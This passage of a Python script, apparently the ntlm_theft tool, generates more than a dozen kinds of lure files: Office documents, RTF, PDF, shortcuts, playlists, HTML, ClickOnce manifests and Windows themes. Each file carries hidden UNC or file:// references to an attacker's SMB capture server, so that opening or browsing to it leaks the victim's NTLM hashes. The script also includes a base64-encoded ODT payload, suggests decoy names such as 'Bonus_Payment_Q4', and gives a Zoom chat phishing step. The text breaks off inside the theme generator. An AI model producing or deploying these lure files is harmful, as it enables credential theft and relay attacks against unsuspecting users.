#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from __future__ import print_function

# Tested on Windows 10 1903 Build 18362.720
# Working Attacks:
# Browse to directory: .url
# Open file: .xml, .rtf, .jnlp, .xml (includePicture), .asx, .docx (includePicture), .docx (remoteTemplate), .docx (via Frameset), .xlsx (via External Cell), .htm (Open locally with Chrome, IE or Edge)
# Open file and allow: pdf
# Browser download and open: .application (Must be downloaded via a web browser and run)
# Partial Open file: .m3u (Works if you open with windows media player, but windows 10 auto opens with groove music)

# In progress - desktop.ini (Need to test older windows versions), autorun.ini (Need to test before windows 7), scf (Need to test on older windows)


# References
# https://ired.team/offensive-security/initial-access/t1187-forced-authentication
# https://www.securify.nl/blog/SFY20180501/living-off-the-land_-stealing-netntlm-hashes.html
# https://ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros
# https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/
# https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
# https://github.com/rocketscientist911/excel-ntlmv2
# https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/#comments
# https://www.youtube.com/watch?v=PDpBEY1roRc
# https://web.archive.org/web/20190106181024/https://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-.LIBRARY-MS-FILETYPE-INFORMATION-DISCLOSURE.txt

import argparse
import io
import os
import shutil
import base64
import zipfile
import sys
from sys import exit

# === COLOR OUTPUT SUPPORT ===
class Colors:
    """ANSI color codes for terminal output"""
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    RESET = '\033[0m'
    
    @staticmethod
    def disable():
        Colors.GREEN = ''
        Colors.YELLOW = ''
        Colors.RED = ''
        Colors.CYAN = ''
        Colors.BOLD = ''
        Colors.RESET = ''

# Disable colors if not a TTY (e.g., piped output)
if not sys.stdout.isatty():
    Colors.disable()

# === RESULTS TRACKING ===
created_files = []  # List of (filename, action) tuples
skipped_files = []  # List of (filetype, reason) tuples

def print_success(filename, action):
    """Print success message and track created file"""
    created_files.append((filename, action))
    print(f"{Colors.GREEN}[+]{Colors.RESET} Created: {filename} ({action})")

def print_skip(filetype, reason):
    """Print skip message and track skipped file"""
    skipped_files.append((filetype, reason))
    print(f"{Colors.YELLOW}[-]{Colors.RESET} Skipping {filetype}: {reason}")

def print_error(message):
    """Print error message"""
    print(f"{Colors.RED}[!]{Colors.RESET} Error: {message}")

def print_summary():
    """Print summary table of all operations"""
    total_created = len(created_files)
    total_skipped = len(skipped_files)
    
    print(f"\n{Colors.BOLD}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}GENERATION SUMMARY{Colors.RESET}")
    print(f"{Colors.BOLD}{'='*60}{Colors.RESET}")
    
    if created_files:
        print(f"\n{Colors.GREEN}Created ({total_created} files):{Colors.RESET}")
        print(f"{'File':<45} {'Action':<15}")
        print("-" * 60)
        for filename, action in created_files:
            # Truncate long filenames
            display_name = filename if len(filename) <= 44 else "..." + filename[-41:]
            print(f"{display_name:<45} {action:<15}")
    
    if skipped_files:
        print(f"\n{Colors.YELLOW}Skipped ({total_skipped} files):{Colors.RESET}")
        print(f"{'Type':<20} {'Reason':<40}")
        print("-" * 60)
        for filetype, reason in skipped_files:
            print(f"{filetype:<20} {reason:<40}")
    
    print(f"\n{Colors.BOLD}Total: {Colors.GREEN}{total_created} created{Colors.RESET}, {Colors.YELLOW}{total_skipped} skipped{Colors.RESET}")

# === FILE TYPE DESCRIPTIONS (for --list) ===
FILE_TYPES = {
    "all": ("Generate all file types", "all"),
    "modern": ("Generate only file types that work on modern Windows", "all"),
    "odt": ("OpenDocument Text - remote image", "OPEN"),
    "scf": ("Shell Command File - IconFile attack (legacy)", "BROWSE TO FOLDER"),
    "url": ("Internet Shortcut - URL and IconFile attacks", "BROWSE TO FOLDER"),
    "lnk": ("Windows Shortcut - IconFile attack", "BROWSE TO FOLDER"),
    "rtf": ("Rich Text Format - INCLUDEPICTURE attack", "OPEN"),
    "xml": ("XML - stylesheet and includepicture attacks", "OPEN"),
    "htm": ("HTML - remote image and handler attacks", "OPEN FROM DESKTOP"),
    "docx": ("Word Document - includepicture, template, frameset", "OPEN"),
    "xlsx": ("Excel Spreadsheet - external cell attack", "OPEN"),
    "wax": ("Windows Media Playlist - remote reference", "OPEN"),
    "m3u": ("M3U Playlist - remote reference", "OPEN IN WMP"),
    "asx": ("ASX Playlist - remote reference", "OPEN"),
    "jnlp": ("Java Web Start - remote JAR reference", "OPEN"),
    "application": (".NET ClickOnce - remote dependency", "DOWNLOAD AND OPEN"),
    "pdf": ("PDF - remote object reference", "OPEN AND ALLOW"),
    "zoom": ("Zoom chat attack instructions (legacy)", "PASTE TO CHAT"),
    "libraryms": ("Windows Library - remote icon", "BROWSE TO FOLDER"),
    "autoruninf": ("Autorun.inf - remote open (legacy)", "BROWSE TO FOLDER"),
    "desktopini": ("desktop.ini - IconResource attack (legacy)", "BROWSE TO FOLDER"),
    "theme": ("Windows Theme - multiple remote references", "INSTALL THEME"),
}

def print_file_types():
    """Print available file types with descriptions"""
    print(f"\n{Colors.BOLD}Available File Types:{Colors.RESET}\n")
    print(f"{'Type':<15} {'Description':<45} {'Action':<20}")
    print("=" * 80)
    for ftype, (desc, action) in FILE_TYPES.items():
        print(f"{ftype:<15} {desc:<45} {action:<20}")
    print()
    sys.exit(0)

#the basic path of the script, make it possible to run from anywhere
script_directory = os.path.dirname(os.path.abspath(__file__))

#arg parser to generate all or one file
#python ntlm_theft --generate all --ip 127.0.0.1 --filename board-meeting2020
parser = argparse.ArgumentParser(
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description='ntlm_theft by Jacob Wilkin(Greenwolf)',
        usage='%(prog)s --generate all --server <ip_of_smb_catcher_server> --filename <base_file_name>')
parser.add_argument('-v', '--version', action='version',
    version='%(prog)s 0.2.0 : ntlm_theft by Jacob Wilkin(Greenwolf)')
parser.add_argument('-vv', '--verbose', action='store_true',dest='verbose',help='Verbose Mode')
parser.add_argument('--list', action='store_true', dest='list_types', help='List all available file types and exit')
parser.add_argument('--force', action='store_true', dest='force', help='Force overwrite without confirmation')
parser.add_argument('-g', '--generate',
	action='store', 
	dest='generate',
	required=False,
	choices=set((
		"odt",
		"modern",
		"all",
		"scf",
		"url",
		"lnk",
		"rtf",
		"xml",
		"htm",
		"docx",
		"xlsx",
		"wax",		
		"m3u",
		"asx",
		"jnlp",
		"application",
		"pdf",
		"zoom",
		"libraryms",
		"autoruninf",
		"desktopini",
		"theme")),
    help='Choose to generate all files or a specific filetype')
parser.add_argument('-s', '--server',action='store', dest='server',required=False,
    help='The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)')
parser.add_argument('-f', '--filename',action='store', dest='filename',required=False,
    help='The base filename without extension, can be renamed later (test, Board-Meeting2020, Bonus_Payment_Q4)')
args = parser.parse_args()

if args.list_types:
    print_file_types()

if not args.generate:
    parser.error("the following arguments are required: -g/--generate")
if not args.server:
    parser.error("the following arguments are required: -s/--server")
if not args.filename:
    parser.error("the following arguments are required: -f/--filename")


# .odt

def create_odt(generate, server, filename):
    # === BASE64 ENCODED PARTS ===
    contentxml1 = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxvZmZpY2U6ZG9jdW1lbnQtY29udGVudCB4bWxuczpvZmZpY2U9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2ZmaWNlOjEuMCIgeG1sbnM6c3R5bGU9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6c3R5bGU6MS4wIiB4bWxuczp0ZXh0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnRleHQ6MS4wIiB4bWxuczp0YWJsZT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczp0YWJsZToxLjAiIHhtbG5zOmRyYXc9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6ZHJhd2luZzoxLjAiIHhtbG5zOmZvPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnhzbC1mby1jb21wYXRpYmxlOjEuMCIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6bWV0YT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczptZXRhOjEuMCIgeG1sbnM6bnVtYmVyPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmRhdGFzdHlsZToxLjAiIHhtbG5zOnN2Zz0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpzdmctY29tcGF0aWJsZToxLjAiIHhtbG5zOmNoYXJ0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmNoYXJ0OjEuMCIgeG1sbnM6ZHIzZD0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpkcjNkOjEuMCIgeG1sbnM6bWF0aD0iaHR0cDovL3d3dy53My5vcmcvMTk5OC9NYXRoL01hdGhNTCIgeG1sbnM6Zm9ybT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6c2NyaXB0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnNjcmlwdDoxLjAiIHhtbG5zOm9vbz0iaHR0cDovL29wZW5vZmZpY2Uub3JnLzIwMDQvb2ZmaWNlIiB4bWxuczpvb293PSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAwNC93cml0ZXIiIHhtbG5zOm9vb2M9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA0L2NhbGMiIHhtbG5zOmRvbT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS94bWwtZXZlbnRzIiB4bWxuczp4Zm9ybXM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDIveGZvcm1zIiB4bWxuczp4c2Q9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4bWxuczpycHQ9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA1L3JlcG9ydCIgeG1sbnM6b2Y9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2Y6MS4yIiB4bWxuczp4aHRtbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgeG1sbnM6Z3JkZGw9Imh0dHA6Ly93d3cudzMub3JnLzIwMDMvZy9kYXRhLXZpZXcjIiB4bWxuczpvZmZpY2Vvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA5L29mZmljZSIgeG1sbnM6dGFibGVvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA5L3RhYmxlIiB4bWxuczpkcmF3b29vPSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAxMC9kcmF3IiB4bWxuczpjYWxjZXh0PSJ1cm46b3JnOmRvY3VtZW50Zm91bmRhdGlvbjpuYW1lczpleHBlcmltZW50YWw6Y2FsYzp4bWxuczpjYWxjZXh0OjEuMCIgeG1sbnM6bG9leHQ9InVybjpvcmc6ZG9jdW1lbnRmb3VuZGF0aW9uOm5hbWVzOmV4cGVyaW1lbnRhbDpvZmZpY2U6eG1sbnM6bG9leHQ6MS4wIiB4bWxuczpmaWVsZD0idXJuOm9wZW5vZmZpY2U6bmFtZXM6ZXhwZXJpbWVudGFsOm9vby1tcy1pbnRlcm9wOnhtbG5zOmZpZWxkOjEuMCIgeG1sbnM6Zm9ybXg9InVybjpvcGVub2ZmaWNlOm5hbWVzOmV4cGVyaW1lbnRhbDpvb3htbC1vZGYtaW50ZXJvcDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6Y3NzM3Q9Imh0dHA6Ly93d3cudzMub3JnL1RSL2NzczMtdGV4dC8iIG9mZmljZTp2ZXJzaW9uPSIxLjIiPjxvZmZpY2U6c2NyaXB0cy8+PG9mZmljZTpmb250LWZhY2UtZGVjbHM+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMdWNpZGEgU2FuczEiIHN2Zzpmb250LWZhbWlseT0iJmFwb3M7THVjaWRhIFNhbnMmYXBvczsiIHN0eWxlOmZvbnQtZmFtaWx5LWdlbmVyaWM9InN3aXNzIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMaWJlcmF0aW9uIFNlcmlmIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO0xpYmVyYXRpb24gU2VyaWYmYXBvczsiIHN0eWxlOmZvbnQtZmFtaWx5LWdlbmVyaWM9InJvbWFuIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iTGliZXJhdGlvbiBTYW5zIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO0xpYmVyYXRpb24gU2FucyZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3dpc3MiIHN0eWxlOmZvbnQtcGl0Y2g9InZhcmlhYmxlIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMdWNpZGEgU2FucyIgc3ZnOmZvbnQtZmFtaWx5PSImYXBvcztMdWNpZGEgU2FucyZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iTWljcm9zb2Z0IFlhSGVpIiBzdmc6Zm9udC1mYW1pbHk9IiZhcG9zO01pY3Jvc29mdCBZYUhlaSZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjxzdHlsZTpmb250LWZhY2Ugc3R5bGU6bmFtZT0iU2ltU3VuIiBzdmc6Zm9udC1mYW1pbHk9IlNpbVN1biIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0ic3lzdGVtIiBzdHlsZTpmb250LXBpdGNoPSJ2YXJpYWJsZSIvPjwvb2ZmaWNlOmZvbnQtZmFjZS1kZWNscz48b2ZmaWNlOmF1dG9tYXRpYy1zdHlsZXM+PHN0eWxlOnN0eWxlIHN0eWxlOm5hbWU9ImZyMSIgc3R5bGU6ZmFtaWx5PSJncmFwaGljIiBzdHlsZTpwYXJlbnQtc3R5bGUtbmFtZT0iT0xFIj48c3R5bGU6Z3JhcGhpYy1wcm9wZXJ0aWVzIHN0eWxlOmhvcml6b250YWwtcG9zPSJjZW50ZXIiIHN0eWxlOmhvcml6b250YWwtcmVsPSJwYXJhZ3JhcGgiIGRyYXc6b2xlLWRyYXctYXNwZWN0PSIxIi8+PC9zdHlsZTpzdHlsZT48L29mZmljZTphdXRvbWF0aWMtc3R5bGVzPjxvZmZpY2U6Ym9keT48b2ZmaWNlOnRleHQ+PHRleHQ6c2VxdWVuY2UtZGVjbHM+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJJbGx1c3RyYXRpb24iLz48dGV4dDpzZXF1ZW5jZS1kZWNsIHRleHQ6ZGlzcGxheS1vdXRsaW5lLWxldmVsPSIwIiB0ZXh0Om5hbWU9IlRhYmxlIi8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJUZXh0Ii8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJEcmF3aW5nIi8+PC90ZXh0OnNlcXVlbmNlLWRlY2xzPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJTdGFuZGFyZCIvPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJTdGFuZGFyZCI+PGRyYXc6ZnJhbWUgZHJhdzpzdHlsZS1uYW1lPSJmcjEiIGRyYXc6bmFtZT0iT2JqZWN0MSIgdGV4dDphbmNob3ItdHlwZT0icGFyYWdyYXBoIiBzdmc6d2lkdGg9IjE0LjEwMWNtIiBzdmc6aGVpZ2h0PSI5Ljk5OWNtIiBkcmF3OnotaW5kZXg9IjAiPjxkcmF3Om9iamVjdCB4bGluazpocmVmPSJmaWxlOi8v"
    contentxml3 = "L3Rlc3QuanBnIiB4bGluazp0eXBlPSJzaW1wbGUiIHhsaW5rOnNob3c9ImVtYmVkIiB4bGluazphY3R1YXRlPSJvbkxvYWQiLz48ZHJhdzppbWFnZSB4bGluazpocmVmPSIuL09iamVjdFJlcGxhY2VtZW50cy9PYmplY3QgMSIgeGxpbms6dHlwZT0ic2ltcGxlIiB4bGluazpzaG93PSJlbWJlZCIgeGxpbms6YWN0dWF0ZT0ib25Mb2FkIi8+PC9kcmF3OmZyYW1lPjwvdGV4dDpwPjwvb2ZmaWNlOnRleHQ+PC9vZmZpY2U6Ym9keT48L29mZmljZTpkb2N1bWVudC1jb250ZW50Pg=="

    # === DECODE PARTS AND INJECT IP ===
    part1 = base64.b64decode(contentxml1).decode("utf-8")
    part2 = base64.b64decode(contentxml3).decode("utf-8")
    fileout = part1 + server + part2

    # === WRITE content.xml ===
    with open("content.xml", "w", encoding="utf-8") as f:
        f.write(fileout)

    # === CREATE BLANK ODT USING ezodf ===
    try:
        from ezodf import newdoc
    except ImportError:
        raise ImportError("Missing `ezodf`. Install with:\n  pip install ezodf && pip install --upgrade lxml")

    temp_odt = "temp.odt"
    odt = newdoc(doctype='odt', filename=temp_odt)
    odt.save()

    # === REBUILD ODT FILE WITH MALICIOUS content.xml ===
    with zipfile.ZipFile(temp_odt, 'r') as zin, zipfile.ZipFile(filename, 'w') as zout:
        for item in zin.infolist():
            if item.filename != 'content.xml':
                zout.writestr(item, zin.read(item.filename))

    with zipfile.ZipFile(filename, 'a') as zf:
        zf.write("content.xml", arcname="content.xml")

    # === CLEAN UP ===
    os.remove("content.xml")
    os.remove(temp_odt)

    print_success(filename, "OPEN IN LIBREOFFICE/OPENOFFICE")


# NOT WORKING ON LATEST WINDOWS
# .scf remote IconFile Attack
# Filename: shareattack.scf, action=browse, attacks=explorer
def create_scf(generate,server,filename):
	if generate == "modern":
		print_skip("SCF", "does not work on modern Windows")
		return
	file = open(filename,'w')
	file.write('''[Shell]
Command=2
IconFile=\\\\''' + server + '''\\tools\\nc.ico
[Taskbar]
Command=ToggleDesktop''')
	file.close()
	print_success(filename, "BROWSE TO FOLDER")

def create_url_url(generate,server,filename):
	file = open(filename,'w')
	file.write('''[InternetShortcut]
URL=file://''' + server + '''/leak/leak.html''')
	file.close()
	print_success(filename, "BROWSE TO FOLDER")


def create_url_icon(generate,server,filename):
	file = open(filename,'w')
	file.write('''[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\\\''' + server + '''\\%USERNAME%.icon
IconIndex=1''')
	file.close()
	print_success(filename, "BROWSE TO FOLDER")

def create_rtf(generate,server,filename):
	file = open(filename,'w')
	file.write('''{\\rtf1{\\field{\\*\\fldinst {INCLUDEPICTURE "file://''' + server + '''/test.jpg" \\\\* MERGEFORMAT\\\\d}}{\\fldrslt}}}''')
	file.close()
	print_success(filename, "OPEN")

def create_xml(generate,server,filename):
	file = open(filename,'w')
	file.write('''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<?mso-application progid="Word.Document"?>
<?xml-stylesheet type="text/xsl" href="\\\\''' + server + '''\\bad.xsl" ?>''')
	file.close()
	print_success(filename, "OPEN")

def create_xml_includepicture(generate,server, filename):
	documentfilename = os.path.join(script_directory,"templates", "includepicture-template.xml") 
	file = open(documentfilename, 'r', encoding="utf8")
	filedata = file.read()
	file.close()
	filedata = filedata.replace('127.0.0.1', server)
	file = open(filename, 'w', encoding="utf8")
	file.write(filedata)
	file.close()
	print_success(filename, "OPEN")

def create_htm(generate,server,filename):
	file = open(filename,'w')
	file.write('''<!DOCTYPE html>
<html>
   <img src="file://''' + server + '''/leak/leak.png"/>
</html>''')
	file.close()
	print_success(filename, "OPEN FROM DESKTOP")

def create_htm_handler(generate,server,filename):
	file = open(filename,'w')
	file.write('''<!DOCTYPE html>
<html>
	<script>
		location.href = 'ms-word:ofe|u|\\\\''' + server + '''\\\\leak\\\\leak.docx';
	</script>
</html>''')
	file.close()
	print_success(filename, "OPEN FROM DESKTOP")

def create_docx_includepicture(generate,server,filename):
	src = os.path.join(script_directory,"templates", "docx-includepicture-template") 
	dest = os.path.join("docx-includepicture-template")
	shutil.copytree(src, dest)  
	documentfilename = os.path.join("docx-includepicture-template", "word", "_rels", "document.xml.rels")
	file = open(documentfilename, 'r')
	filedata = file.read()
	file.close()
	filedata = filedata.replace('127.0.0.1', server)
	file = open(documentfilename, 'w')
	file.write(filedata)
	file.close()
	shutil.make_archive(filename, 'zip', "docx-includepicture-template")
	os.rename(filename +".zip",filename)
	shutil.rmtree("docx-includepicture-template")
	print_success(filename, "OPEN")

def create_docx_remote_template(generate,server,filename):
	src = os.path.join(script_directory,"templates", "docx-remotetemplate-template") 
	dest = os.path.join("docx-remotetemplate-template")
	shutil.copytree(src, dest)  
	documentfilename = os.path.join("docx-remotetemplate-template", "word", "_rels", "settings.xml.rels")
	file = open(documentfilename, 'r')
	filedata = file.read()
	file.close()
	filedata = filedata.replace('127.0.0.1', server)
	file = open(documentfilename, 'w')
	file.write(filedata)
	file.close()
	shutil.make_archive(filename, 'zip', "docx-remotetemplate-template")
	os.rename(filename +".zip",filename)
	shutil.rmtree("docx-remotetemplate-template")
	print_success(filename, "OPEN")

def create_docx_frameset(generate,server,filename):
	src = os.path.join(script_directory,"templates", "docx-frameset-template") 
	dest = os.path.join("docx-frameset-template")
	shutil.copytree(src, dest)  
	documentfilename = os.path.join("docx-frameset-template", "word", "_rels", "webSettings.xml.rels")
	file = open(documentfilename, 'r')
	filedata = file.read()
	file.close()
	filedata = filedata.replace('127.0.0.1', server)
	file = open(documentfilename, 'w')
	file.write(filedata)
	file.close()
	shutil.make_archive(filename, 'zip', "docx-frameset-template")
	os.rename(filename +".zip",filename)
	shutil.rmtree("docx-frameset-template")
	print_success(filename, "OPEN")

def create_xlsx_externalcell(generate,server,filename):
	import xlsxwriter
	workbook = xlsxwriter.Workbook(filename)
	worksheet = workbook.add_worksheet()
	worksheet.write_url('AZ1', "external://"+server+"\\share\\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)")
	workbook.close()
	print_success(filename, "OPEN")

def create_wax(generate,server,filename):
	file = open(filename,'w')
	file.write('''https://''' + server + '''/test
file://\\\\''' + server + '''/steal/file''')
	file.close()
	print_success(filename, "OPEN")

def create_m3u(generate,server,filename):
	file = open(filename,'w')
	file.write('''#EXTM3U
#EXTINF:1337, Leak
\\\\''' + server + '''\\leak.mp3''')
	file.close()
	print_success(filename, "OPEN IN WMP")

def create_asx(generate,server,filename):
	file = open(filename,'w')
	file.write('''<asx version="3.0">
   <title>Leak</title>
   <entry>
      <title></title>
      <ref href="file://''' + server + '''/leak/leak.wma"/>
   </entry>
</asx>''')
	file.close()
	print_success(filename, "OPEN")

def create_jnlp(generate,server,filename):
	file = open(filename,'w')
	file.write('''<?xml version="1.0" encoding="UTF-8"?>
<jnlp spec="1.0+" codebase="" href="">
   <resources>
      <jar href="file://''' + server + '''/leak/leak.jar"/>
   </resources>
   <application-desc/>
</jnlp>''')
	file.close()
	print_success(filename, "OPEN")

def create_application(generate,server,filename):
	file = open(filename,'w')
	file.write('''<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd" manifestVersion="1.0" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" xmlns="urn:schemas-microsoft-com:asm.v2" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xrml="urn:mpeg:mpeg21:2003:01-REL-R-NS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <assemblyIdentity name="Leak.app" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" xmlns="urn:schemas-microsoft-com:asm.v1" />
   <description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
   <deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
   <dependency>
      <dependentAssembly dependencyType="install" codebase="file://''' + server + '''/leak/Leak.exe.manifest" size="32909">
         <assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
         <hash>
            <dsig:Transforms>
               <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
            </dsig:Transforms>
            <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />
            <dsig:DigestValue>ESZ11736AFIJnp6lKpFYCgjw4dU=</dsig:DigestValue>
         </hash>
      </dependentAssembly>
   </dependency>
</asmv1:assembly>''')
	file.close()
	print_success(filename, "DOWNLOAD AND OPEN")

def create_pdf(generate,server,filename):
	file = open(filename,'w')
	file.write('''%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R
   /AA <<
	   /O <<
	      /F (\\\\\\\\''' + server + '''\\\\test)
		  /D [ 0 /Fit]
		  /S /GoToE
		  >>
	   >>
	   /Parent 2 0 R
	   /Resources <<
			/Font <<
				/F1 <<
					/Type /Font
					/Subtype /Type1
					/BaseFont /Helvetica
					>>
				  >>
				>>
>>
endobj
4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj
trailer
<<
	/Root 1 0 R
>>
%%EOF''')
	file.close()
	print_success(filename, "OPEN AND ALLOW")


def create_zoom(generate,server,filename):
	if generate == "modern":
		print_skip("Zoom", "does not work on latest versions")
		return
	file = open(filename,'w')
	file.write('''To attack zoom, just put the following link along with your phishing message in the chat window:

\\\\''' + server + '''\\xyz
''')
	file.close()
	print_success(filename, "PASTE TO CHAT")

def create_theme(generate,server,filename):
	with open(filename, 'w') as file:
		file.write('''[Theme]
; Windows - IDS_THEME_DISPLAYNAME_AERO_LIGHT
DisplayName=\\'''+ server +''' Theme
SetLogonBackground=0
; Computer - SHIDI_SERVER
[CLSID\\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\\DefaultIcon]
DefaultValue=\\\\'''+server+'''\\setup.exe,-109

; UsersFiles - SHIDI_USERFILES
[CLSID\\{59031A47-3F72-44A7-89C5-5595FE6B30EE}\\DefaultIcon]
DefaultValue=\\\\'''+server+'''\\setup.exe,-123

; Network - SHIDI_MYNETWORK
[CLSID\\{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}\\DefaultIcon]
DefaultValue=\\\\'''+server+'''\\setup.exe,-25

; Recycle Bin - SHIDI_RECYCLERFULL SHIDI_RECYCLER
[CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\DefaultIcon]
Full=\\\\'''+server+'''\\setup.exe,-54
Empty=\\\\'''+server+'''\\setup.exe,-55

[Control Panel\\Cursors]
AppStarting=\\\\'''+server+'''\\setup.exe
Arrow=\\\\'''+server+'''\\aero_arrow.cur
Crosshair=
Hand=\\\\'''+server+'''\\aero_link.cur
Help=\\\\'''+server+'''\\aero_helpsel.cur
IBeam=
No=\\\\'''+server+'''\\aero_unavail.cur
NWPen=\\\\'''+server+'''\\aero_pen.cur
SizeAll=\\\\'''+server+'''\\aero_move.cur
SizeNESW=\\\\'''+server+'''\\aero_nesw.cur
SizeNS=\\\\'''+server+'''\\aero_ns.cur
SizeNWSE=\\\\'''+server+'''\\aero_nwse.cur
SizeWE=\\\\'''+server+'''\\aero_ew.cur
UpArrow=\\\\'''+server+'''\\aero_up.cur
Wait=\\\\'''+server+'''\\aero_busy.ani
DefaultValue=Windows Default
DefaultValue.MUI=@main.cpl,-1020

[Control Panel\\Desktop]
Wallpaper=\\\\'''+server+'''\\setup.exe
TileWallpaper=0
WallpaperStyle=10
Pattern=
MultimonBackgrounds=0

[VisualStyles]
Path=\\\\'''+server+'''\\Themes\\Aero\\Aero.msstyles
ColorStyle=NormalColor
Size=NormalSize
AutoColorization=0
ColorizationColor=0XC40078D4
